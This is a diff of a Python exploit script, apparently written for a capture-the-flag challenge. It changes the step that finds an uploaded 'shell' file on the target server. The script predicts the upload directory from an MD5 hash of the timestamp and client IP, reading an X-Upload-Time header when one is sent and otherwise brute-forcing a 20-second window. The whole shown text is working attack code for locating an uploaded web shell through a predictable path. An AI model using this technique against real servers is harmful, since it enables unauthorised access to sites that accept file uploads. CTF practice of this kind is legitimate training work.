@@ -71,20 +71,31 @@ else:
     sys.exit(1)
 
 # ── Step 4: Predict Path & Retrieve Flag ──
-print("[*] Step 4: Brute-forcing time window for correct path...")
+print("[*] Step 4: Accessing shell...")
 
-# Try a small window around the fetched server time (e.g., -2 to +5 seconds)
-# The server time we grabbed was *before* the upload, so actual time is >= fetched time.
+# Prioritize the X-Upload-Time header if available (most accurate)
+upload_timestamp = None
+if 'X-Upload-Time' in r.headers:
+    upload_timestamp = int(r.headers['X-Upload-Time'])
+    print(f"[+] Found X-Upload-Time header: {upload_timestamp}")
+
+timestamps_to_check = []
+if upload_timestamp:
+    timestamps_to_check.append(upload_timestamp)
+else:
+    print("[-] X-Upload-Time header missing. Brute-forcing based on index time...")
+    # Widen window: 0 to +20 seconds
+    for drift in range(0, 20):
+        timestamps_to_check.append(upload_start_time + drift)
+
 found_flag = False
 
-for drift in range(0, 10):
-    timestamp = upload_start_time + drift
+for ts in timestamps_to_check:
     # Calculate hash: md5(timestamp + ip)[:8]
-    raw = f"{timestamp}{client_ip}"
+    raw = f"{ts}{client_ip}"
     directory = hashlib.md5(raw.encode()).hexdigest()[:8]
     
     url = f"{TARGET}/uploads/{directory}/{filename}"
-    # print(f"    Checking: {url} (ts={timestamp})")
     
     try:
         r = requests.get(url, timeout=2)
